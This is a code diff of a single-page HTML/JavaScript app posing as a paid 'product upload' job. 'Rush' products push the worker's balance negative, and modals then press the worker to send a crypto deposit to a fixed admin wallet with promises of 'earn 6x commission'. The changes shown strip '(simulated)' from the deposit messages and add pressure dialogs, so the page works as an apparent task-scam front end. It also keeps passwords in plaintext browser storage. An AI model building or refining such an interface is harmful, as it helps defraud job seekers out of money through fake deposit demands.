+            'Panasonic Lumix S1R 47.3MP Full-Frame Mirrorless Camera',
+            'Fujifilm X-T4 26.1MP Mirrorless Camera with 16-80mm Lens',
+            'DJI Inspire 3 8K Cinema Drone with Zenmuse X9 Gimbal',
+            'Sony PXW-Z750 4K 2/3-inch 3-CMOS Broadcast Camera',
+            'Blackmagic URSA Mini Pro 12K Cinema Camera 12K Recording',
+            'Canon XA75 4K UHD Camcorder with 20x Zoom and Night Vision'
+        ];
 
         const normalProducts = [
             { value: 180, commission: 0.5 },
@@ -500,13 +1145,14 @@ html
             { value: 275, commission: 0.5 },
             { value: 330, commission: 0.5 },
             { value: 190, commission: 0.5 },
+            { value: 418.94, commission: 0.5 },
             { value: 210, commission: 0.5 },
         ];
 
         const rushProducts = [
             { value: 1200, commission: 3 },
             { value: 1800, commission: 3 },
-            { value: 2579, commission: 3 },
+            { value: 2579.35, commission: 3 },
             { value: 3500, commission: 3 },
             { value: 900, commission: 3 },
             { value: 4200, commission: 3 },
@@ -517,136 +1163,234 @@ html
         function randomItem(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
         function fmt(num) { return num.toFixed(2); }
 
-        function showToast(msg, type = 'info') {
-            const container = document.getElementById('toastContainer');
-            if (!container) return;
-            const colors = { info: '#f0b34b', success: '#64ff9e', danger: '#ff6b6b' };
-            const div = document.createElement('div');
-            div.className = 'toast';
-            div.style.borderLeftColor = colors[type] || colors.info;
-            div.textContent = msg;
-            container.prepend(div);
-            setTimeout(() => div.remove(), 5000);
+        // ===== MODALS =====
+        function openInsufficientModal() {
+            const needed = Math.abs(state.balance);
+            $('insufficientBalance').textContent = `-$${fmt(needed)}`;
+            $('insufficientRushValue').textContent = `$${fmt(state.rushProductValue)}`;
+            $('insufficientRequired').textContent = `$${fmt(needed)}`;
+            const comm = state.rushProductValue * 0.03;
+            $('insufficientCommission').textContent = `$${fmt(comm)}`;
+            $('insufficientWallet').textContent = ADMIN_WALLET;
+            $('insufficientModal').classList.add('active');
         }
 
-        function updateUI() {
-            const bal = state.balance;
-            const balanceDisplay = $('balanceDisplay');
-            if (balanceDisplay) {
-                balanceDisplay.textContent = `$${fmt(bal)}`;
-                balanceDisplay.className = 'balance' + (bal < 0 ? ' negative' : '');
-            }
-            const depositDisplay = $('depositDisplay');
-            if (depositDisplay) depositDisplay.textContent = `$${state.deposit}`;
-            const bonusDisplay = $('bonusDisplay');
-            if (bonusDisplay) bonusDisplay.textContent = `$${state.bonus}`;
-            const profitDisplay = $('profitDisplay');
-            if (profitDisplay) profitDisplay.textContent = `$${fmt(state.profit)}`;
-            const uploadCount = $('uploadCount');
-            if (uploadCount) uploadCount.textContent = state.uploadedCount;
-            const commissionEarned = $('commissionEarned');
-            if (commissionEarned) commissionEarned.textContent = `$${fmt(state.totalCommission)}`;
-            const baseSalaryDisplay = $('baseSalaryDisplay');
-            if (baseSalaryDisplay) baseSalaryDisplay.textContent = `$${state.baseSalary}`;
-            const userDisplay = $('userDisplay');
-            if (userDisplay) userDisplay.textContent = state.username;
-
-            const accountTypeBadge = $('accountTypeBadge');
-            if (accountTypeBadge) {
-                const typeLabel = state.accountType === 'training' ? 'Training Account' : 'Working Account';
-                accountTypeBadge.textContent = typeLabel;
-                accountTypeBadge.className = 'badge ' + (state.accountType === 'training' ? 'badge-normal' : 'badge-rush');
-            }
-
-            if (state.currentProduct) {
-                const p = state.currentProduct;
-                const isRush = p.commission === 3;
-                const productTypeBadge = $('productTypeBadge');
-                if (productTypeBadge) {
-                    productTypeBadge.textContent = isRush ? `Rush (3%)` : `Normal (0.5%)`;
-                    productTypeBadge.className = 'badge ' + (isRush ? 'badge-rush' : 'badge-normal');
-                }
-                const productValue = $('productValue');
-                if (productValue) productValue.textContent = `$${fmt(p.value)}`;
-                const commissionDisplay = $('commissionDisplay');
-                if (commissionDisplay) {
-                    const comm = p.value * (p.commission / 100);
-                    commissionDisplay.textContent = `$${fmt(comm)}`;
-                }
-            }
-
-            const negativeAlert = $('negativeAlert');
-            if (negativeAlert) {
-                if (state.balance < 0) {
-                    negativeAlert.classList.remove('hidden');
-                    const negativeAmount = $('negativeAmount');
-                    if (negativeAmount) negativeAmount.textContent = `-$${fmt(Math.abs(state.balance))}`;
-                    const depositNeeded = $('depositNeeded');
-                    if (depositNeeded) depositNeeded.textContent = `$${fmt(Math.abs(state.balance))}`;
-                } else {
-                    negativeAlert.classList.add('hidden');
-                }
-            }
-
-            const nextPayout = $('nextPayout');
-            if (nextPayout) {
-                const remain = state.productsPerSet * state.maxSets - state.uploadedCount;
-                nextPayout.textContent = remain <= 0 ? '✅ Completed! Withdraw available' : `${remain} uploads remaining`;
-            }
+        function closeInsufficientModal() {
+            $('insufficientModal').classList.remove('active');
         }
 
-        function generateProduct() {
-            if (Math.random() < 0.2 && state.uploadedCount > 0) {
-                return { ...randomItem(rushProducts), commission: 3 };
+        function confirmInsufficientDeposit() {
+            const needed = Math.abs(state.balance);
+            state.balance += needed;
+            state.deposit += needed;
+            state.negativeBalance = false;
+            state.isRushActive = false;
+            state.rushDepositNeeded = 0;
+            closeInsufficientModal();
+            alert(`✅ Deposit of $${fmt(needed)} confirmed!\n\nYou can now continue working and earn 6x commission!`);
+            updateUI();
+            updateProductCard();
+        }
+
+        function copyInsufficientWallet() {
+            copyToClipboard(ADMIN_WALLET, 'Wallet address copied!');
+        }
+
+        function openCompleteModal() {
+            const totalEarned = state.totalCommission;
+            const percentage = (totalEarned / 1130) * 100;
+            const bonus = totalEarned * 0.05;
+            const total = totalEarned + bonus;
+            const avg = total / 35;
+
+            $('completeProducts').textContent = '35';
+            $('completeCommission').textContent = `$${fmt(totalEarned)}`;
+            $('completePercentage').textContent = `${fmt(percentage)}%`;
+            $('completeBonus').textContent = `$${fmt(bonus)}`;
+            $('completeTotal').textContent = `$${fmt(total)}`;
+            $('completeAverage').textContent = `$${fmt(avg)}`;
+            $('completeTime').textContent = `~45 min`;
+
+            $('completeModal').classList.add('active');
+        }
+
+        function closeCompleteModal() {
+            $('completeModal').classList.remove('active');
+        }
+
+        function openDepositModal() {
+            $('depositModal').classList.add('active');
+            $('modalWalletAddress').textContent = ADMIN_WALLET;
+        }
+
+        function closeDepositModal() {
+            $('depositModal').classList.remove('active');
+        }
+
+        function copyModalWallet() {
+            copyToClipboard(ADMIN_WALLET, 'Wallet address copied!');
+        }
+
+        function copyToClipboard(text, msg) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('✅ ' + msg);
+            }).catch(() => {
+                const ta = document.createElement('textarea');
+                ta.value = text;
+                document.body.appendChild(ta);
+                ta.select();
+                document.execCommand('copy');
+                document.body.removeChild(ta);
+                alert('✅ ' + msg);
+            });
+        }
+
+        // ===== WALLET =====
+        function saveWallet() {
+            const address = $('walletInput').value.trim();
+            if (!address) { alert('Please enter a valid wallet address.'); return; }
+            if (address.length < 20) { alert('Please enter a valid wallet address (minimum 20 characters).'); return; }
+            state.walletAddress = address;
+            localStorage.setItem('wallet_' + state.username, address);
+            updateWalletDisplay();
+            alert('✅ Wallet address saved successfully!');
+        }
+
+        function updateWalletDisplay() {
+            const display = $('walletDisplay');
+            const input = $('walletInput');
+            const status = $('walletStatus');
+            
+            if (state.walletAddress) {
+                display.classList.remove('hidden');
+                $('walletAddress').textContent = state.walletAddress;
+                status.textContent = '✅ Set';
+                status.className = 'badge badge-success';
+                input.value = state.walletAddress;
             } else {
-                return { ...randomItem(normalProducts), commission: 0.5 };
+                display.classList.add('hidden');
+                status.textContent = 'Not Set';
+                status.className = 'badge badge-warning';
+                const saved = localStorage.getItem('wallet_' + state.username);
+                if (saved) {
+                    state.walletAddress = saved;
+                    updateWalletDisplay();
+                }
             }
+        }
+
+        function copyWallet() {
+            copyToClipboard(state.walletAddress, 'Wallet address copied!');
         }
 
         // ===== LOGIN / REGISTER =====
-        function login() {
-            const username = $('loginUsername').value.trim() || 'demo_user';
+        function loginWithPhone() {
+            const countryCode = $('countryCode').value;
+            const phone = $('loginPhone').value.trim();
             const password = $('loginPassword').value.trim() || '123123';
-            
-            // Check if user exists in localStorage
-            const savedPass = localStorage.getItem('expert_pass_' + username);
-            if (savedPass && savedPass !== password) {
-                alert('❌ Wrong password!');
+
+            if (!phone) { alert('Please enter your phone number.'); return; }
+
+            const fullPhone = countryCode + phone;
+            const savedData = localStorage.getItem('expert_user_' + fullPhone);
+
+            if (savedData) {
+                const data = JSON.parse(savedData);
+                if (data.password === password) {
+                    state.username = data.username || fullPhone;
+                    state.fullName = data.fullName || '';
+                    state.phone = fullPhone;
+                    state.loggedIn = true;
+                    state.accountType = 'training';
+                    resetTrainingAccount();
+                    
+                    const savedWallet = localStorage.getItem('wallet_' + state.username);
+                    if (savedWallet) state.walletAddress = savedWallet;
+                    
+                    $('loginScreen').classList.add('hidden');
+                    $('registerScreen').classList.add('hidden');
+                    $('dashboardScreen').classList.remove('hidden');
+                    updateUI();
+                    updateWalletDisplay();
+                    updateProductCard();
+                    alert(`✅ Welcome back ${data.fullName || state.username}!`);
+                    return;
+                } else {
+                    alert('❌ Wrong password/PIN!');
+                    return;
+                }
+            }
+
+            const savedPass = localStorage.getItem('expert_pass_' + phone);
+            if (savedPass && savedPass === password) {
+                state.username = phone;
+                state.phone = fullPhone;
+                state.loggedIn = true;
+                state.accountType = 'training';
+                resetTrainingAccount();
+                const savedWallet = localStorage.getItem('wallet_' + state.username);
+                if (savedWallet) state.walletAddress = savedWallet;
+                $('loginScreen').classList.add('hidden');
+                $('registerScreen').classList.add('hidden');
+                $('dashboardScreen').classList.remove('hidden');
+                updateUI();
+                updateWalletDisplay();
+                updateProductCard();
+                alert('✅ Login successful!');
                 return;
             }
-            
-            state.username = username;
-            state.loggedIn = true;
-            state.accountType = 'training';
-            resetTrainingAccount();
-            $('loginScreen').classList.add('hidden');
-            $('registerScreen').classList.add('hidden');
-            $('dashboardScreen').classList.remove('hidden');
-            updateUI();
+
+            alert('❌ No account found with this phone number. Please register first.');
         }
 
-        function register() {
-            const username = $('regUsername').value.trim() || 'user_' + Math.floor(Math.random() * 10000);
+        function registerWithPhone() {
+            const name = $('regName').value.trim();
+            const countryCode = $('regCountryCode').value;
+            const phone = $('regPhone').value.trim();
             const password = $('regPassword').value.trim() || '123123';
             const referral = $('regReferral').value.trim();
 
-            // Save to localStorage
-            localStorage.setItem('expert_pass_' + username, password);
-            if (referral) {
-                localStorage.setItem('expert_referral_' + username, referral);
+            if (!name) { alert('Please enter your full name.'); return; }
+            if (!phone) { alert('Please enter your phone number.'); return; }
+            if (phone.length < 7) { alert('Please enter a valid phone number.'); return; }
+            if (password.length < 4) { alert('Password/PIN must be at least 4 digits.'); return; }
+
+            const fullPhone = countryCode + phone;
+
+            if (localStorage.getItem('expert_user_' + fullPhone)) {
+                alert('❌ This phone number is already registered. Please login.');
+                return;
             }
 
-            alert(`✅ Registration successful!\n\nUsername: ${username}\nPassword: ${password}\n\nYou are now logged in.`);
+            const username = 'user_' + phone.slice(-4);
+            const userData = {
+                fullName: name,
+                phone: fullPhone,
+                username: username,
+                password: password,
+                referral: referral,
+                registeredAt: new Date().toISOString()
+            };
+
+            localStorage.setItem('expert_user_' + fullPhone, JSON.stringify(userData));
+            localStorage.setItem('expert_pass_' + username, password);
+            if (referral) localStorage.setItem('expert_referral_' + username, referral);
+
+            alert(`✅ Registration successful!\n\nName: ${name}\nPhone: ${fullPhone}\nUsername: ${username}\nPassword: ${password}\n\nYou are now logged in.`);
             
-            // Auto-login
             state.username = username;
+            state.fullName = name;
+            state.phone = fullPhone;
             state.loggedIn = true;
             state.accountType = 'training';
             resetTrainingAccount();
+            
             $('registerScreen').classList.add('hidden');
             $('loginScreen').classList.add('hidden');
             $('dashboardScreen').classList.remove('hidden');
             updateUI();
+            updateWalletDisplay();
+            updateProductCard();
         }
 
         function showRegister() {
@@ -672,6 +1416,9 @@ html
             state.rushDepositNeeded = 0;
             state.baseSalary = 0;
             state.workingDays = 0;
+            state.isRushActive = false;
+            state.totalUploads = 0;
+            state.sessionStart = Date.now();
             state.currentProduct = generateProduct();
         }
 
@@ -687,6 +1434,8 @@ html
                 state.currentSet = 1;
                 state.history = [];
                 state.negativeBalance = false;
+                state.isRushActive = false;
+                state.totalUploads = 0;
                 state.currentProduct = generateProduct();
                 alert('Switched to Working Account');
             } else {
@@ -695,13 +1444,83 @@ html
                 alert('Switched to Training Account');
             }
             updateUI();
+            updateProductCard();
+        }
+
+        function generateProduct() {
+            if (Math.random() < 0.2 && state.uploadedCount > 0) {
+                state.isRushActive = true;
+                return { ...randomItem(rushProducts), commission: 3 };
+            } else {
+                state.isRushActive = false;
+                return { ...randomItem(normalProducts), commission: 0.5 };
+            }
+        }
+
+        function updateProductCard() {
+            const p = state.currentProduct;
+            if (!p) return;
+
+            const isRush = p.commission === 3;
+            const comm = p.value * (p.commission / 100);
+            const rebate = p.value + comm;
+
+            $('productBadge').textContent = isRush ? 'RUSH 3%' : 'Normal';
+            $('productBadge').className = 'product-badge ' + (isRush ? 'rush' : 'normal');
+
+            const nameIndex = Math.floor(Math.random() * productNames.length);
+            $('productName').innerHTML = isRush ? 
+                `<span class="highlight">⚡ RUSH</span> ${productNames[nameIndex]}` :
+                `<span class="highlight">${productNames[nameIndex].substring(0, 20)}</span> ${productNames[nameIndex].substring(20)}`;
+
+            $('detailValue').textContent = `$${fmt(p.value)}`;
+            $('detailValue').className = 'detail-value ' + (isRush ? 'red' : 'gold');
+            $('detailCommission').textContent = isRush ? '3%' : '0.5%';
+            $('detailProfit').textContent = `$${fmt(comm)}`;
+            $('detailProfit').className = 'detail-value ' + (isRush ? 'red' : 'green');
+            $('detailRebate').textContent = `$${fmt(rebate)}`;
+            $('uploadCount').textContent = state.uploadedCount;
+
+            const total = state.productsPerSet * state.maxSets;
+            const progress = (state.uploadedCount / total) * 100;
+            $('progressFill').style.width = Math.min(progress, 100) + '%';
+
+            if (state.balance < 0 && state.isRushActive) {
+                openInsufficientModal();
+            }
+        }
+
+        function updateUI() {
+            const bal = state.balance;
+            $('balanceDisplay').textContent = `$${fmt(bal)}`;
+            $('balanceDisplay').className = 'balance' + (bal < 0 ? ' negative' : '');
+            $('depositDisplay').textContent = `$${state.deposit}`;
+            $('bonusDisplay').textContent = `$${state.bonus}`;
+            $('profitDisplay').textContent = `$${fmt(state.profit)}`;
+            $('commissionEarned').textContent = `$${fmt(state.totalCommission)}`;
+            $('baseSalaryDisplay').textContent = `$${state.baseSalary}`;
+            $('userDisplay').textContent = state.fullName || state.username;
+
+            const typeLabel = state.accountType === 'training' ? 'Training Account' : 'Working Account';
+            $('accountTypeBadge').textContent = typeLabel;
+            $('accountTypeBadge').className = 'badge ' + (state.accountType === 'training' ? 'badge-normal' : 'badge-rush');
+
+            const remain = state.productsPerSet * state.maxSets - state.uploadedCount;
+            $('nextPayout').textContent = remain <= 0 ? '✅ Completed! Withdraw available' : `${remain} uploads remaining`;
         }
 
         // ===== UPLOAD / BOOST =====
         function uploadProduct() {
             if (state.balance < 0) {
-                alert('⚠️ Negative balance! Please deposit first.');
+                alert('⚠️ Insufficient balance! Please deposit to continue.');
+                openInsufficientModal();
                 return;
+            }
+
+            if (!state.walletAddress) {
+                if (!confirm('⚠️ You haven\'t set a wallet address yet. Your earnings will be sent there.\n\nDo you want to continue without a wallet address?')) {
+                    return;
+                }
             }
 
             const p = state.currentProduct;
@@ -710,6 +1529,7 @@ html
             state.profit += comm;
             state.totalCommission += comm;
             state.uploadedCount++;
+            state.totalUploads++;
 
             state.history.push({
                 type: p.commission === 3 ? 'Rush' : 'Normal',
@@ -718,12 +1538,18 @@ html
                 balanceAfter: state.balance,
             });
 
-            alert(`✅ Uploaded! Earned $${fmt(comm)}`);
+            if (state.uploadedCount === 35) {
+                alert(`✅ You have completed 35 product uploads!\n\nTotal Earned: $${fmt(state.totalCommission)}\nProfit Percentage: ${fmt((state.totalCommission / 1130) * 100)}%\n\nCheck your full earnings summary!`);
+                openCompleteModal();
+            }
 
             if (state.uploadedCount >= state.productsPerSet * state.maxSets) {
                 alert('🎉 Completed 2 sets! You can withdraw now.');
                 if (state.accountType === 'training') {
                     alert(`Training complete! Total earned: $${fmt(state.profit + state.bonus)}`);
+                    if (state.walletAddress) {
+                        alert(`💰 Funds will be sent to:\n${state.walletAddress}`);
+                    }
                 }
             } else if (state.uploadedCount % state.productsPerSet === 0 && state.uploadedCount > 0) {
                 state.currentSet++;
@@ -732,44 +1558,61 @@ html
 
             state.currentProduct = generateProduct();
             updateUI();
+            updateProductCard();
         }
 
         function boostProduct() {
             const p = randomItem(rushProducts);
             state.currentProduct = { ...p, commission: 3 };
-            state.isRush = true;
-            alert('⚡ Boost activated! Rush Product loaded.');
-            updateUI();
-
+            state.isRushActive = true;
+            state.rushProductValue = p.value;
+            
             const comm = p.value * 0.03;
             const newBal = state.balance + comm;
+            
             if (newBal < 0) {
                 state.balance = newBal;
                 state.negativeBalance = true;
                 state.rushDepositNeeded = Math.abs(newBal);
                 updateUI();
-                alert(`⚠️ Rush Product caused negative balance! Deposit $${fmt(Math.abs(newBal))}`);
+                updateProductCard();
+                alert(`⚡ RUSH PRODUCT DETECTED!\n\nProduct Value: $${fmt(p.value)}\nCurrent Balance: $${fmt(newBal)}\nAmount to Deposit: $${fmt(Math.abs(newBal))}\n\nPlease deposit to continue and earn 6x commission!`);
+                openInsufficientModal();
+            } else {
+                state.balance = newBal;
+                updateUI();
+                updateProductCard();
+                alert(`⚡ Boost activated! Rush Product loaded.\n\nValue: $${fmt(p.value)}\nCommission: 3%\nProfit: $${fmt(comm)}`);
             }
         }
 
-        // ===== CRYPTO DEPOSIT =====
+        // ===== SIMULATE DEPOSIT =====
         function simulateCryptoDeposit() {
+            if (!state.walletAddress) {
+                alert('⚠️ Please set your wallet address first!');
+                return;
+            }
+
             const needed = state.balance < 0 ? Math.abs(state.balance) : 0;
             if (needed > 0) {
                 state.balance += needed;
                 state.deposit += needed;
                 state.negativeBalance = false;
+                state.isRushActive = false;
                 state.rushDepositNeeded = 0;
-                alert(`💳 Deposited $${fmt(needed)} via Crypto (simulated)`);
+                closeInsufficientModal();
+                alert(`💳 Deposited $${fmt(needed)} via Crypto\n📤 Sent to: ${state.walletAddress}`);
                 updateUI();
+                updateProductCard();
             } else {
                 const amt = prompt('Enter deposit amount (USD):', '100');
                 if (amt && !isNaN(amt) && parseFloat(amt) > 0) {
                     const val = parseFloat(amt);
                     state.balance += val;
                     state.deposit += val;
-                    alert(`💳 Deposited $${fmt(val)} via Crypto (simulated)`);
+                    alert(`💳 Deposited $${fmt(val)} via Crypto\n📤 Sent to: ${state.walletAddress}`);
                     updateUI();
+                    updateProductCard();
                 }
             }
         }
@@ -777,10 +1620,8 @@ html
         // ===== HISTORY =====
         function showHistory() {
             const panel = $('historyPanel');
-            if (!panel) return;
-            panel.classList.remove('hidden');
+            panel.classList.toggle('hidden');
             const list = $('historyList');
-            if (!list) return;
             list.innerHTML = '';
             if (state.history.length === 0) {
                 list.innerHTML = '<p class="small-text">No history yet.</p>';
@@ -798,8 +1639,7 @@ html
         }
 
         function closeHistory() {
-            const panel = $('historyPanel');
-            if (panel) panel.classList.add('hidden');
+            $('historyPanel').classList.add('hidden');
         }
 
         function logout() {
@@ -812,12 +1652,13 @@ html
         // ===== INIT =====
         state.currentProduct = generateProduct();
         updateUI();
+        updateProductCard();
 
-        // Auto-login if user exists
-        const savedUser = localStorage.getItem('expert_user');
-        if (savedUser) {
-            $('loginUsername').value = savedUser;
-        }
+        document.addEventListener('click', function(e) {
+            if (e.target === $('depositModal')) closeDepositModal();
+            if (e.target === $('insufficientModal')) closeInsufficientModal();
+            if (e.target === $('completeModal')) closeCompleteModal();
+        });
     </script>
 
 </body>
